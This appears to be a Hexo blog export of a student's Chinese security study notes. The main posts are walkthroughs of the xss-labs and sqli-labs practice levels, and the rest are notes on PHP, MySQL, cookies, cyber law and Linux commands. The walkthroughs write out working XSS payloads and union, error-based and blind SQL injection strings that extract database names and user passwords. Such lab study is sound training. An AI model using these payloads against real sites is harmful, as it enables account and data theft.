{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"","slug":"xss","date":"2022-04-20T02:47:49.933Z","updated":"2022-04-20T09:42:34.815Z","comments":true,"path":"2022/04/20/xss/","link":"","permalink":"http://example.com/2022/04/20/xss/","excerpt":"","text":"在经历了xss漏洞学习后，在靶场进行了自我的学习，从1-12关，xss的漏洞按照网上的教程很好做，但在学习中发现，xss的漏洞并不是那么容易的发现，还是需要在多次训练后才能慢慢掌握诀窍，目前仍旧是照葫芦画瓢的阶段，希望在学习中能够慢慢发现诀窍和形成不一样的思维。 less11.点击图片完成get请求，提交name变量test，完整的显示在返回的页面源代码中。 2.get请求的name变量放入xss poc，完整返回在html中，浏览器响应xss poc。 3.后台代码分析，通过$_GET[“name”]，获取name的值，没有过滤通过echo直接进行了输出 less 21.利用name参数提交poc，查看返回的html代码，需要构造闭合 2.构造闭合，浏览器响应poc。 3.后台源代码分析 获取浏览器提交的keyword值，未进行过滤，输出在。 如果是keyword提交的是alert(xss),返回的就会是,javascript引擎并不会执行,所以需要构造闭合。 keyword提交test\">alert(1)&#x2F;&#x2F;,php处理后返回的html就会是 alert(1)&#x2F;&#x2F;“&gt;，&#x2F;&#x2F;是注释的作用，javascript引擎执行alert(1) less 31.keyword提交”test&gt;alert(1)&#x2F;&#x2F;构造闭合进行注入，根据返回的html代码，后台对尖括号进行了过滤 2.构造标签事件进行过滤，返回值实在input标签中，尝试构造onclick事件触发xss。点击输入框后，触发onclick事件，响应onclick中的javascript代码。 3.构造事件onmouseover，事件成功执行javascript:伪协议。 4.后台源代码分析，采用htmlspecialchars函数对获取keyword变量进行过滤，输出在input标签的value中。htmlspecichars对尖括号进行了过滤。 less 41.keyword提交poc,根据后台返回的源代码，后台针对尖括号进行了过滤 2.构造事件onmouseover，构造语句闭合，成功执行javascript语句 3.后台源代码分析。对get请求的keyword变量，过滤掉尖括号，采用htmlspecialchars过滤后用echo直接输出在返回的html中。 less 51.构造事件 “ oninput='alert(1)'，返回的html代码对on进行了过滤。尝试大小写，依然进行了过滤。尝试编码，不识别。 2.尝试POC test\">alert&#x2F;&#x2F;,根据返回的html，后台对script进行了过滤，但是并未对尖括号进行过滤。 3.利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript:伪协议，”&gt;,没有对javascript进行过滤，触发xss 4.后台源代码分析，对get提交的keyword变量，script替换成scr_ipt,on替换成o_n，htmlspecialchars函数过滤后，输出在html中 less 61.经测试替换了script，on，没有过滤&lt;&gt;。构造a标签，利用href属性支持javascript:伪协议构造poc，后台对href关键字进行替换，尝试采用大小写混写进行了绕过。 2.后台源代码分析。对get提交的keyword变量，替换&lt;script 、on、src、data、href关键字，采用htmlspecialchars过滤后输出在html中 Less7首先尝试输入&lt;&gt;alert(1)&lt;&gt; 发现被屏蔽 之后尝试双写，过关 Less8通过源代码发现输入的值会被传入herf，点击友情链接会执行被带入的参数 利用这点进行注入，javascript:alert()，发现被过滤，大小写绕过也不行，尝试html实体注入 less 91.采用第八关的poc，发现poc中应包含合法的url，poc中添加&#x2F;&#x2F;http://www.baidu.com,发现可以进行绕过 2.后台源代码分析。get提交的keyword变量，替换关键字script、on、src、data、href、”，判断该变量有无http:&#x2F;&#x2F; less 101.对keyword提交poc，根据返回的源代码，过滤了尖括号，尝试编码不能绕过，无法构造事件触发xss、无法利用属性的javascript协议、无法利用css注入。 2.详细查看源代码，可能有隐藏的表单，尝试提交t_link、t_history、t_sort变量，t_sort变量返回在了html的value中，尝试进行了绕过。构造poc：”type&#x3D;”text” onclick&#x3D;”alert(1)”，web浏览器成功执行 。ps:type&#x3D;”text”为构造一个文本框，用来触发onclick事件 3.后台源代码分析，获取了get请求的keyword变量、t_sort变量，t_sort变量过滤掉了尖括号，输出在value属性中 less 11刚开始进来就已经发现相比于上一个关卡，又多了一个ref参数， 在对于sql注入的学习中，我们已经知道，reffer参数注入或者cookies注入这一类的，于是大胆猜测这次在reffer处进行xss注入，打开hackbar，添加了reffer的选项后，添加语句 “ type&#x3D;”text” onclick&#x3D;” alert(‘xss’) 确定后，点击框处，结束本题 less 12第十二题一开始进入后先是查看源代码，发现11题的ref换成了ua， ua在这种地方，联想以前的useragent注入，现在这个ua大概率就是useragent，操作相较于第十一题没什么新鲜感，依旧是将之前放到ref的地方换成useragent，如图所示 依旧是点击框处，结束本题","categories":[],"tags":[]},{"title":"","slug":"less4-20","date":"2022-03-31T07:16:45.131Z","updated":"2022-04-01T03:41:41.219Z","comments":true,"path":"2022/03/31/less4-20/","link":"","permalink":"http://example.com/2022/03/31/less4-20/","excerpt":"","text":"helloless 4第四关里通过报错可以发现 id&#x3D;1，id&#x3D;1‘，id&#x3D;1’） 都可以出现正确结果，然而当我们输入id&#x3D;1“时候出现了报错 根据报错我们分析一下错误内容 ‘“1”“） limit 0，1’ 减去‘’部分我们可以获得 “1“”）这个信息 那么就可以得知我们的sql语言是 select from where id&#x3D;（”id“）这样的信息，那么我们输入id&#x3D;1”)加上–+来忽略后面的”）并且插入我们的查询代码，继续用union查询来查询 先查库名 先让id值等于一个不可能的数字-1 执行后面的语句 id&#x3D;-1“）union select 1,2,database() –+ 再查询表名字 ?id&#x3D;-1”) union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ –+ 再查询 所要找的表里面的列 ?id&#x3D;-1”) union select 1,2, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ –+ 得到了有三个列 分别是 id admin password 查询账号密码 ?id&#x3D;-1”) union select 1,2, group_concat(password）from security.users –+ 最终得到结果，不再进行演示，毕竟这个问题的难点全在一开始对于错误的解释 需要我们分析出来争取的sql查询语句 less5第五题 刚开始就是这个样子 说明使用盲注入或者报错注入了，由于手工注入的不方便性，这次使用报错注入。 这边就要提到 updatexml()这个函数了，其本意就是一个更新xml的函数，具体的格式是updatexml(目标xml内容，xml文档路径，更新的内容) 其中xml内容无关紧要，我们用1来代替 路径我们用一个子查询来报错引出我们所需要的东西，用concat来拼接（0x7e，子查询，0x7e），而更新的内容也不是什么重要的内容，报错注入主要是想让sql数据库来在一些重要的错误时爆出对哦我们有用的消息 先用之前学过的判断id的类型 再用updatexml来进行报错注入 ?id&#x3D;1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+ 从而得到库名 security 而查表的时候，内容与之前联合查询差不多，唯独加上了limit 的限制 因为他限制只有一行，所以我们从limit 0，1 一直实验到我们所需要的名上 ?id&#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e),1) –+ 查到users表 继续查找列表 ?id&#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e),1) –+ 找到密码，但需要一个个的看 ?id&#x3D;1’ and updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1) –+ less 6第六关则是实验了 1，1’ ，1”后 发现只有在1“能过报错 说明id&#x3D; ”input“ 其他的与第五关所差不大 ?id&#x3D;1” and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+ ?id&#x3D;1“ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e),1) –+ 查到users表 ?id&#x3D;1” and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ limit 0,1),0x7e),1) –+ ?id&#x3D;1“ and updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1) –+ 注意！注意！注意！千万要是英文字符，已经在这里吃亏了无数次了，老是错在一些奇奇怪怪的地方，等回过头来才发现，复制粘贴的时候容易变成中文符号，一定要注意！！！！！ less 7由于让我们使用outfile 但是依旧无法解决，决定使用比较慢的手工布尔盲注 首先先寻找注入点，这关的注入点很怪，先后实验了1‘ 1” 1’） 1“）1‘)),最后成功了 那么布尔盲注开始，首先我们做了很多题了，已经知道了库名和表名以及列名， 所以首先先了解几个知识补充 left()函数left（database(),1）&#x3D;’s‘ left(a,b)寓意着从左侧a处截前b个，正确返回1，错误返回0，上述表达的便是数据库第一个是否为s regexp() like 同理 substr(a,b,c) 从b开始截取a字符串c个长度 ascii() 将字符串转化为ascii码 例如 select ascii（substr(select database()),1,1） 这个就是吧database里面的第一个字符提出并转化成为ascii码 chr()&#x2F;ord() 首先还是确定库名， ?id&#x3D;1’)) and substr((select database()),1,1)&#x3D;’s’ –+ 回显正常，那么确定库名还是老的那个security 其实也可以直接查?id&#x3D;1’)) and substr((select database()),1,8)&#x3D;’security’–+ 省去一些时间，但是在世界问题中还是应该一步一步来，最好是利用ascii码来确定范围 ascii(substr(select datatbast()),1,1) &gt;数字日常世界问题中还是这么去做合适 接着就是表名，我们需要users表 ?id&#x3D;1’)) and substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),1,5)&#x3D;’users’ –+ 回显正常，我们就有了表名 再就是列名 ?id&#x3D;1’)) and substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 2,1),1,8)&#x3D;’password’ –+ 剩下的就是对于密码的一个接一个尝试，就不多截图了 ?id&#x3D;1’)) and substr((select group_concat(username,password) from security.users limit 0,1),1,1) –+ less 8第八题使用布尔盲注 先用length来判断库的长度 ?id&#x3D;1’ and length(database())&#x3D;8 –+ 成功则会返回跟?id&#x3D;1 一样的数值 由于手工注入过于麻烦 ，我这次使用burp 的集束炸弹来进行攻击 先打开burp，打开网址后，输入?id&#x3D;1’ and substr((select database()),1,1)&#x3D;’s’ –+ 回车前打开拦截 发送到inturder 在第一个1和最后一个s分别加上特殊字符，这一步是为了从1开始与ascii码的第一个开始寻找，第一个字符从第一个ascii开始筛找，然后第二个第三个，以此类推 找到库名后再找表名*?id&#x3D;1’ and substr((select table_name from information_schema.tables where table_schema&#x3D;‘security’ limit 0,1),3,1)&#x3D;‘p’–+* 和字段名?id&#x3D;1’ and substr((select column_name from information_schema.columns where table_name&#x3D;‘users’ limit 0,1),1,1)&#x3D;‘u’–+* 最后的密码 ?id&#x3D;1’ and substr((select password from security.users limit 0,1),1,1)&#x3D;‘d’–+ 由于burp跑的太慢了只出来了一个，暂时先不加图片了 less 9时间盲注，由于跟第八题太过相像，burp上一个还没跑完，就同上一个就好了 less 10先判断是否有注入点 尝试1 1’ 1”在1” 试验成功，然后继续时间盲注 less11post的方式 不和以前一样 需要在网页上提交相对应的账号密码，但是我们仍可以通过万能钥匙来找到注入点 先输入（在username那里输入，不是网址）’ or 1&#x3D;1 #(只能用这个)不需要输入密码，直接回车 可以看到正常回显，说明存在注入点，开始正常注入 我们将用户栏当作我们的代码输入点 输入’union select 1,2 # 可以看到，我们的显示位置就出现了 所以，我们就继续的联合注入 输入’ union select 1,database() # 出现库名在二的位置 继续注入 ‘ union select 1,table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1 # (为了找到users表) 继续 ‘ union select 1,column_name from information_schema.columns where table_name&#x3D;’users’ limit 2,1 # 找到password ，查找密码 ‘ union select 1,password from users limit 2,1 # 可以继续查找，这里就不一一找到了 less 12也是post格式的，与11相似，但是闭合不同，这次的闭合通过‘ ” ’） “） ‘）） ”）） 多种尝试 最后结果是”)) 在前面换成这个，与11题一摸一样 less 13跟上面的略有不同 换成了报错注入，在尝试了多次后发现无法联合注入，尝试报错注入 在尝试输入’) or 1&#x3D;1 # 得到报错 说明id是被‘’抱住的，所以我们的闭合就是‘） 然后开始报错注入，利用updatexml函数来进行注入 输入’) and updatexml(1,concat(0x7e,(select database()),0x7e),1) # 继续找表名’) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e),1) # 找到users表 找列名’) and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 2,1),0x7e),1) # 最后一步’) and updatexml(1,concat(0x7e,(select password from security.users limit 2,1),0x7e),1) # less 14另外一种闭合的传参形式，继续使用报错注入即可，不多赘述 less 15一开始尝试了报错注入，但是并没有回显，说明报错注入不可用，可以尝试用布尔盲注， 先测试库名的长度 ’or (length(database()))&#x3D;8 # 图片显示我们已经logged in 说明我们的库确实是长度为八 来确定一下开头的首字母 ‘ or ascii(substr(database(),1,1)) &#x3D;115 # (图片15-2)我们看到，出现的是正常的界面 我们仍然logged in 说明执行成功，我们的开头的第一个首字母就是ascii码为115的’s‘，长度为八位，那就还是我们的老朋友’security‘剩下的就是按照之前的操作进行布尔盲注 不多做赘述，可以看第八题的做法 less 16又没有回显，无法使用联合查询和报错注入，显然又是一个布尔盲注，测试了 ’ ” ‘） “） ‘)) “)) 后面加上 or 1&#x3D;1 # 最终测出只有”）可以成功logged in 剩下的与上文一模一样不过多解释 less 17刚进入界面就看见了一个密码重置，看来我们需要重置密码，在密码栏上做手脚。 经过测试，直接输入‘ or 1&#x3D;1 # 在密码上，但是会出现报错，想到账户名没有，便输入我们的admin作为账户名，再在密码上输入。 成功出现正确回显，先尝试着联合注入 但是并没有成功，并出现报错回显，所以开始进行报错注入 发现可以出现库名，那么就按照报错注入的方式进行，与第十三题一样，就是需要换到password的位置传参 less 18开局先看见自己的id address ，并且确实是自己的地址，说明数据库记录了我的地址并且显示出来了，说明在记录我IP的地方可能就存在注入点。 输入admin 来进行登录可以看到我们能够发现多了一个user-agent 的出现 还是先了解几个需要知道的请求头的意义 user-agent:浏览器身份识别的字符串 referer:表示浏览器前一个访问页面，可以是认为之前访问页面的链接将浏览器带到了当前页面 accept:可接受的响应内容类型 x-forwarded-for:可以用来表示HTTP请求段真实的IP date:发送信息的日期和时间 我们通过用burp抓包，发现他是接受uagent的，那么我们就要想办法把他闭合，从uagent那里直接闭合，并且用# 来注释掉后面的内容，用1 1 来代替 ‘ or updatexml(1,concat(0x7e,(select database()),0x7e),1) and ‘1’&#x3D;’1 # 注意这需要用burp抓包直接改user-agent的地址发送到repeater 修改 剩下的看之前的报错注入即可，注意后面加个and ‘1’&#x3D;’1 less 19这道题也是出现了我们的IP 照常输入admin，发现这道题是通过referer 来注入， ‘ or updatexml(1,concat(0x7e,(select database()),0x7e),1) and ‘1’&#x3D;’1 # 一样可以 剩下的不解释 less 20登录看见是cookie和user-agent，这里我们选用cookie来做 打开burp抓包，在cookie哪里在最后加一个 ‘ 进行报错 再加上联合查询的语句或者报错查询都可 cookie: uname&#x3D;admin ‘ union select 1,2,database() # 能得到我们熟悉的库名 （cookie: uname&#x3D;admin ‘ or updatexml(1,concat(0x7e,(select database(),0x7e),1) and ‘1’&#x3D;’1 #）报错 后续就用联合方便写作 cookie: uname&#x3D;admin ‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ # cookie: uname&#x3D;admin ‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ # cookie: uname&#x3D;admin ‘ union select 1,2,group_concat(password) from security.users #","categories":[],"tags":[]},{"title":"","slug":"sqli_lib练习","date":"2022-03-24T11:10:36.282Z","updated":"2022-03-24T15:32:34.046Z","comments":true,"path":"2022/03/24/sqli_lib练习/","link":"","permalink":"http://example.com/2022/03/24/sqli_lib%E7%BB%83%E4%B9%A0/","excerpt":"","text":"1sqli-lib这几天新学习了sql手动注入，对sql注入做了些许了解 首先是命令的了解和基础概念 1基础命令sql的基础语言从登录开始 select * #查询命令from #自己的数据库名称where #条件username&#x3D;‘’ and password&#x3D;‘ ’ 以上就是对于登录数据库所需要的基础代码其中可以通过or 1&#x3D;1 – 这一条命令来判定为真，从而注释掉后面的代码来达到进入数据库的目的例如 where username &#x3D;’’ or 1&#x3D;1 – ‘and password &#x3D;’ ‘因为– 注释掉了后面的内容，并且or 两边同时为假才为假，1&#x3D;1恒真，所以可以直接进入 2数据库的应知道的名字名称数据库中默认含有一个库 叫做information_schema 数据库，用来储存信息 其中它的表名分别有 schemata（数据库名） tables（表名） columns（列名或者是字段名） 这四个我们将会在练习中多次运用到 其中 schemata中有一个schema_name来存储数据库名 tables中有table_schema 和 table_name分别存储数据库名和表名 在我们查询中 会有 database(),user(),version()分别用来查询数据库，用户，和版本 注意：user这个并不是表名 3sql注入的类型sql注入有两种类型 数字型和字符型 数字型表现为 id&#x3D;1 字符型表现为id&#x3D;1’ 可通过修改对应的id值：正常数字，字符，反斜杠 来判断是否存在注入点 通过网页对我们操作的报错可以进行解读 如 我们输入？id&#x3D;1‘ 报错为 ’‘1’‘ limit 0.1 ’ 将两边的‘’去除，则我们能发现 ‘1’‘ limit 说明我们的id是被’‘包围的，说明我们的id是字符串类型的， 再有 此时出现’‘1’‘）limit 0.1’ 我们继续分解 ‘1’‘） limit 我们输入的id是1’那么我们的id是字符串型的且，需要一个）来注释掉前面的（，从而继续执行操作 至于查询操作我们先从库名到表名到表里的内容一次进行 这次我们使用union来进行操作 先查询库名 这个比较简单 ?id&#x3D;-1 union select 1,2, database() –+ 能够得知我们的库名是security 我们拿到了库名就可以进行下一步操作，去看看库里有哪些表 ?id&#x3D;-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ –+ 从而得知库里的表有这几个，我们需要密码的和id那么我们进入user里面寻找 ?id&#x3D;-1 union select 1,2, group_concat(column.name)from information_schema.columns where table_name&#x3D;’users’ –+ 如此，我们知道列表里有三种，最后直接查询密码即可 ?id&#x3D;-1 union select 1,2, group_concat(password) from security.users –+ 第三题看上文中对于报错的理解就可得知缺少） 所以在id&#x3D;1’) 基础上与第二题相差无几 以上就是目前已经学习到的知识","categories":[],"tags":[]},{"title":"HTTP会话控制的概述","slug":"HTTP会话控制的概述","date":"2022-03-17T07:59:51.022Z","updated":"2022-03-17T07:52:43.042Z","comments":true,"path":"2022/03/17/HTTP会话控制的概述/","link":"","permalink":"http://example.com/2022/03/17/HTTP%E4%BC%9A%E8%AF%9D%E6%8E%A7%E5%88%B6%E7%9A%84%E6%A6%82%E8%BF%B0/","excerpt":"","text":"HTTP协议本身是无状态的 http协议无法记录用户经常上哪些网站，有什么爱好，也无法记录用户的ID账号和密码，这就是无状态 HTTP协议本身是无状态的，客户端只需要简单的向服务器请求下载某些文件，无论是客户端还是服务器都没有必要记录彼此过去的行为，每一次请求之间都是独立的 HTTP协议自身不具备保存之前发送过的请求或相应的功能","categories":[],"tags":[]},{"title":"Cookie注意事项","slug":"Cookie注意事项","date":"2022-03-17T07:59:51.020Z","updated":"2022-03-17T07:52:43.983Z","comments":true,"path":"2022/03/17/Cookie注意事项/","link":"","permalink":"http://example.com/2022/03/17/Cookie%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","excerpt":"","text":"1.SetCookie()之前不能有任何html输出，空格，空白行都不行 2.SetCookie()之后，在当前页调用echo $_COOKIE[“name”]不会有输出，必须刷新或到下一个页面才可以看到Cookie值 3.使用Cookie的限制，一个浏览器能创建的Cookie数量最多为30个，并且每个不能超过4KB，每个WEB站点能设置的Cookie总数不能超过20个 4.Cookie是保存在客户端的，如果用户禁用了Cookie，那么Cookie也就失效了 5.Cookie的生命周期到了，Cookie就会失效 6.设置一个Cookie时失效时间为time()那么在页面浏览完之后就被删除","categories":[],"tags":[]},{"title":"MySQL程序常用命令","slug":"MySQL程序常用命令","date":"2022-03-17T07:59:46.604Z","updated":"2022-03-17T07:52:42.335Z","comments":true,"path":"2022/03/17/MySQL程序常用命令/","link":"","permalink":"http://example.com/2022/03/17/MySQL%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"显示所有数据库：show databases; 选定默认数据库：use dbname; 显示默认数据库中所有表：show tables; 放弃正在输入的命令：\\c 显示命令清单：\\h 退出MySQL程序：\\q 查看MySQL服务器状态信息：\\s","categories":[],"tags":[]},{"title":"MySQL常用数据类型","slug":"MySQL常用数据类型","date":"2022-03-17T07:59:46.603Z","updated":"2022-03-17T07:52:42.107Z","comments":true,"path":"2022/03/17/MySQL常用数据类型/","link":"","permalink":"http://example.com/2022/03/17/MySQL%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"分类 备注和说明 数据类型 说明 二进制数据类型 存储非字符和文本的数据 BLOB 可用来存储图像 文本数据类型 字符数据包括任意字母、符号或数字字符的组合 char 固定长度的Unicode字符数据 varchar 可变长度非Unicode数据 text 存储长文本信息 日期和时间 日期和时间在单引号内输入 time 时间 date 日期 datetime 日期和时间 数据型数据 该数据仅包含数字，包括正数，负数以及浮点数 int、smallint 整数 float、double 浮点数 数值列类型 所有数值列类型的类型名及其说明和所占的字节数见下表 类型名 说明 TINYINT 非常小的整数 SMALLINT 较小的整数 MEDIUMINT 中等大小的整数 INT 标准整数 BIGINT 大整数 FLOAT 单精度浮点数 DOUBLE 双精度浮点数 DECIMAL 一个串的浮点数","categories":[],"tags":[]},{"title":"PHP文件访问函数:读取文件","slug":"PHP文件访问函数读取文件","date":"2022-03-17T07:59:46.601Z","updated":"2022-03-17T07:52:43.848Z","comments":true,"path":"2022/03/17/PHP文件访问函数读取文件/","link":"","permalink":"http://example.com/2022/03/17/PHP%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/","excerpt":"","text":"读取文件常用函数 fread() ：读取整个文件或文件中指定长度的字符串，可用于二进制文件读取 fgets() ：读取文件中的一行字符 fgetss() ：读取文件中的一行字符并去掉所有HTML和PHP标记 fgetc() ：读取文件中的一个字符 file_get_contents() ：将文件读入字符串 file() ：把文件读入到一个数组中 readfile() ：读取一个文件，并输出到输出缓冲","categories":[],"tags":[]},{"title":"PHP文件操作函数：操作文件","slug":"PHP文件操作函数：操作文件","date":"2022-03-17T07:59:46.599Z","updated":"2022-03-17T07:52:43.461Z","comments":true,"path":"2022/03/17/PHP文件操作函数：操作文件/","link":"","permalink":"http://example.com/2022/03/17/PHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6/","excerpt":"","text":"函数 语法 说明 copy() copy(源文件，目的文件) 复制文件 unlink() unlink(目标文件) 删除文件 rename() rename(旧文件名，新文件名) 重命名文件或目录，或移动文件 ftruncate() ftruncate(目标文件资源，截取长度) 将文件截断到指定长度 file_exists() file_exists(目标文件名) 判断文件或文件夹是否存在 is_file() is_file(文件名) 判断指定的路径存在且为文件 realpath() realpath(文件名) 返回文件的物理路径 pathinfo() pathinfo(文件名) 以数组形式返回文件的路径和文件名信息","categories":[],"tags":[]},{"title":"PHP目录的基本操作：操作目录","slug":"PHP目录的基本操作：操作目录","date":"2022-03-17T07:59:46.596Z","updated":"2022-03-17T07:52:42.576Z","comments":true,"path":"2022/03/17/PHP目录的基本操作：操作目录/","link":"","permalink":"http://example.com/2022/03/17/PHP%E7%9B%AE%E5%BD%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%9B%AE%E5%BD%95/","excerpt":"","text":"函数 说明 示例 mkdir(pathname) 新建一个指定的目录 mkdir(‘temp’) rmdir(dirname) 删除目录，该目录必须为空 rmdir(‘data’) getcwd(void) 取得当前文件所在的目录 echo getcwd(); chdir(dirname) 改变当前目录 chdir(‘..&#x2F;‘); opendir(path) 打开目录，返回目录的指针 $dirh&#x3D;opendir(‘temp’); closedir() 关闭目录，参数为目录指针 closedir($dirh); readdir() 遍历目录 $file&#x3D;readdir($dirh); scandir(psth,sort) 以数组形式遍历目录，sort参数可设置升序或降序排列 $arr&#x3D;acandir(‘D:\\ICQ’,1);","categories":[],"tags":[]},{"title":"PHP访问MySQL数据库的流程","slug":"PHP访问MySQL数据库的流程","date":"2022-03-17T07:59:46.594Z","updated":"2022-03-17T07:52:43.644Z","comments":true,"path":"2022/03/17/PHP访问MySQL数据库的流程/","link":"","permalink":"http://example.com/2022/03/17/PHP%E8%AE%BF%E9%97%AEMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B5%81%E7%A8%8B/","excerpt":"","text":"第一步：连结MySQL服务器 ​ 使用 mysql_connect() 函数建立与MySQL服务器的连接 第二步：选择MySQL数据库 ​ 使用 mysql_select_db() 函数选择MySQL数据库服务器上的数据库，并与数据库建立连接 第三步：执行SQL语句 ​ 在选择的数据库中使用mysql_query() 函数执行SQL语句。 对数据的操作方式主要包括四种方式： 查询数据：使用select语句实现数据的查询功能 插入数据：使用insert into语句向数据库中插入数据 更新数据：使用update语句修改数据库中的记录 删除数据：使用delete语句删除数据库中的记录","categories":[],"tags":[]},{"title":"","slug":"第一节课","date":"2022-03-12T07:28:01.676Z","updated":"2022-03-01T08:06:41.069Z","comments":true,"path":"2022/03/12/第一节课/","link":"","permalink":"http://example.com/2022/03/12/%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE/","excerpt":"","text":"一 中国人民共和国刑法熟悉中国的网络安全法获取该计算机信息存储，处理或者传输的数据，或者对该计算机信息系统实施非法控制。 提供专门用于侵入，非法控制计算机信息系统的程序，工具，或者明治他人实施侵入，非法控制计算机信息系统的违法犯罪行为而为其提供程序， 三年以上七年以下 在刑法地二百八十五，二百八十六条中，明确了单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚。 后加一条，网络服务提供者不履行法律，行政法规规定的信息网络安全义务 造成 1 致使违法信息大量传播 2致使用户信息泄露，造成严重后果的 3致使刑事案件证据灭失，情节严重的 4有其他严重情节的 单位罚款，直接负责人依前三款规定处罚 网络安全法位于2016.11.7通过 于2017.6.1正式开始执行 中华人民共和国密码法于中华人民共和国第十三届全国人民代表大会常务委员会第十四次会议 2019.10.26通过 于2020.1.1开始正式执行 中华人民共和国数据安全法2021.6.10通过 2021.9.1正式执行 个人信息保护法2021.8.20通过 2021.11.1正式执行 操作系统功能进程管理进度调度，在单用户单任务的情况下，处理器仅为一个用户的一个任务所独占 存储管理存储分配，存储共享，存储保护和存储扩张 设备管理设备分配，设备传输控制，设备独立性 文件管理文件存储空间的管理，目录管理，文件操作管理，文件保护 作业管理负责处理用户提交的任何要求 分类计算机操作系统：unix，windows unix：Linux，mac，os Windows：windows pc，Windows server 二 虚拟机根目录包含内容&#x2F;bin存放常用命令 重要执行文档 &#x2F;boot启动Linux的核心文件包括链接文件镜像文件 &#x2F;dev存Linux的外部设备 &#x2F;etc存放所有系统管理的配置文件和子目录 配置文件 &#x2F;home用户的主目录 &#x2F;lib存放着系统最基本的动态来链接共享库 &#x2F;mediaLinux识别的U盘光驱等在这个文件下 &#x2F;mnt暂时挂载别的别的文件系统的， &#x2F;opt给主机额外安装软件所设置的目录 &#x2F;root系统管理员的，超级权限者的用户主目录 &#x2F;sbin系统管理员的系统管理程序 &#x2F;srv启动后需要提取的数据 &#x2F;tmp存放临时文件 &#x2F;lost+found系统非法关机，会存放在这里 &#x2F;porc虚拟目录，是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息 &#x2F;sys针对进程信息的proc文件系统，针对设备的devfs文件系统以及针对伪终端的devpts文件系统 &#x2F;selinux是Redhat和centos所特有的目录是一种安全机制，类似于防火墙 &#x2F;var目录的意义和内容&#x2F;var&#x2F;cache&#x2F;应用程序本身运作中会产生的一些暂存性 &#x2F;var&#x2F;lib&#x2F;程序运行中，需要使用的数据文件放置的目录，各自有各自的目录 &#x2F;var&#x2F;lock&#x2F;日志的目录 &#x2F;var&#x2F;mail&#x2F;存放邮件的目录 &#x2F;var&#x2F;run&#x2F;系统运行以来，描述系统信息的文件 &#x2F;var&#x2F;spool&#x2F;打印队列和其他队列工作的目录，每个spool在这里都有自己的子目录 三 Linux的常用命令rmxxxxx # rm 选项 文件或者目录 -f 强制删除 -i 提示删除 -r 递归删除 morexxxxx # more 选项 文件名 -f 计算行数，实际的行数，不是自动换行的过后的 -p 不卷动显示每一页先清屏在显示内容 -c 先显示再清屏旧的 -s 当遇到连续以上两行空格，会替换成一行 -u 不显示下引号 +n 从第n行开始显示 -n 一行显示n个 find查找命令 xxxxxx #find 路径 选项 输出形式 -表示￥home目录 路径 .表示当前目录 &#x2F;表示根目录 选项 -name 名字 -perm 权限 -prune不在当前目录找 -user 文件属主来查找 -group 文件所属组来查找 -nogroup 查找无有效所属组的文件 -nouser 查找无有效属主的文件 -type 文件类型查找 输出形式 print 标准输出 exec 对匹配的文件执行该参数的shell命令，形式为command（）\\； ok 与exec作用相同，区别在于执行前会询问是否执行 grepxxxx# grep 选项 模式文件名 -c 仅列出文件中包含模式的行数 -i 忽略模式中大小写 -l 列出带有匹配名的文件 -n 每一行前列出列号 -v 列出没有匹配模式的行 -w 把表达式当作一个完整的单字符来搜寻忽略部分匹配的行 vim的使用&#x2F;word 向光标之下寻找一个名称为word 的字符串 ?word 向光标之上找 n 代表重复之前的一个搜寻的动作 N重复之前的搜寻的反动作 vim有三种编辑模式 命令模式 字符按键和shift的组合 ；输入字符 enter；回车换行 back space：退格，删除光标前一个 del 删除键 删除光标后一个 方向键 移动光标 ’ home&#x2F;end：移动光标到首位&#x2F;尾部 page up&#x2F;down 上下翻页 insert；切换插入和替换 esc 推出 输入模式 底线命令模式","categories":[],"tags":[]},{"title":"","slug":"第二节课","date":"2022-03-12T07:28:01.673Z","updated":"2022-03-17T07:55:32.648Z","comments":true,"path":"2022/03/12/第二节课/","link":"","permalink":"http://example.com/2022/03/12/%E7%AC%AC%E4%BA%8C%E8%8A%82%E8%AF%BE/","excerpt":"","text":"第二节课 title: 